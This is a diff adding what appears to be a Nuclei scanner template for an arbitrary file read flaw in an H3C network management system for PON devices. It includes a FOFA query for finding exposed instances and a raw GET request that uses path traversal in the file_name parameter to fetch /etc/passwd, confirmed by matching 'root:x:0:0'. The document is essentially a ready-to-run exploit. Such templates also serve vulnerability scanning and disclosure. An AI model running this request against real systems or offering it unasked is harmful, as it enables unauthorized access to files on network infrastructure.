@@ -1,0 +1,26 @@
+id: h3c-nms-arbitrary-file-read
+
+info:
+  name: H3C 网络管理系统文件访问控制缺陷
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="webui/js/jquerylib/jquery-1.7.2.min.js"
+      该系统为GPON及XG(S)-PON设备提供运维管理功能，包括配置自动化分发与备份、故障告警可视化监控、远程固件更新等核心服务。
+  tags: H3C
+
+http:
+- raw:
+  - |
+    GET /webui/?file_name=../../../../../etc/passwd&g=sys_dia_data_down HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+    Connection: Keep-Alive
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
